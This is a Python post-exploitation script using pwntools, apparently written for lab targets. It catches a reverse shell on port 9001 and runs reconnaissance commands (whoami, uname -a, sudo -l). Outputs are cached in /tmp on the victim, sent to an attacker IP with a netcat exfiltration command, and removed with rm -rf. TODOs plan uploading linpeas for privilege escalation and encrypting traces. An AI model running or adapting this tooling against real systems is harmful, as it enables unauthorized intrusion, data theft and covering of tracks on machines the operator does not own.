import hashlib
import pwn

ATTACKER_IP = '10.10.14.7'
EXPECTED_PROMPT = b'$ '
LISTENING_PORT = 9001
NETCAT_FILE_TRANSFER_PORT = 9002
COMMAND_TIMEOUT = 1 # Waits at least 1 second when 'until' string doesn't match
ENCODING = 'utf-8'
COMMAND_OUTPUT_REMOTE_FOLDER = '/tmp/'

# TODO: Upload file to victim, execute it, and download output. e.g.: linpeas
#       https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
# TODO: Encrypt whatever I can. e.g.: Cached command files, transferred files, etc
def main():
    short_commands = [
        'whoami',
        'hostname',
        'uname -a',
        'which nc' # TODO: Verify if netcat exists. Do this for other tools and choose tools accordingly.
    ]

    long_commands = [
        'sudo -l' # TODO: Add dependency to netcat
    ]

    commands_output = {}
    with pwn.listen(LISTENING_PORT).wait_for_connection() as client:
        for command in short_commands:
            output = send_command_read_output(client, command.encode(), single_line_output=True)
            commands_output[command] = output

        for command in long_commands:
            output = send_command_read_cached_temporary_file(client, command)
            commands_output[command] = output
    
    for command, output in commands_output.items():
        print(f'{command}\n--------\n{output}\n--------\n')

def ignore_until_prompt(client, prompt=EXPECTED_PROMPT):
    if not isinstance(prompt, bytes):
        print('Prompt must be bytes')
        exit()

    client.recvuntil(prompt)

def send_command_read_output(client, command, prompt=EXPECTED_PROMPT, timeout=COMMAND_TIMEOUT, single_line_output=False):
    ignore_until_prompt(client, prompt)
    client.sendline(command)
    client.recvuntil(b'\n')

    output = ''
    while True:
        output_line = client.recvuntil(b'\n', timeout=timeout).decode(ENCODING)
        output += output_line

        if not output_line or single_line_output:
            break

    return output.strip()

def send_command_temporary_file(client, command, remote_output_folder=COMMAND_OUTPUT_REMOTE_FOLDER):
    hash_str = hashlib.md5(command.encode()).hexdigest()
    output_remote_temporary_file = remote_output_folder + hash_str

    if remote_file_exists(client, output_remote_temporary_file):
        return output_remote_temporary_file

    command = f'{command} > {output_remote_temporary_file}'.encode()
    client.sendline(command)
    return output_remote_temporary_file

def download_remote_file(client, remote_path, attacker_ip=ATTACKER_IP, port=NETCAT_FILE_TRANSFER_PORT):
    client.sendline(f'nc -w 3 {attacker_ip} {port} < {remote_path}'.encode())

    downloaded_output = None
    with pwn.listen(port).wait_for_connection() as client:
        downloaded_output = client.recvall().strip()

    return downloaded_output.decode(ENCODING)

def delete_remote_file(client, remote_path):
    client.sendline(f'rm -rf {remote_path}'.encode())

def remote_file_exists(client, remote_path):
    output = send_command_read_output(client, f'file {remote_path}'.encode(), single_line_output=True)
    return 'No such file or directory' not in output

def send_command_read_cached_temporary_file(client, command):
    remote_temporary_file = send_command_temporary_file(client, command)
    output = download_remote_file(client, remote_temporary_file)
    return output

if __name__ == '__main__':
    main()
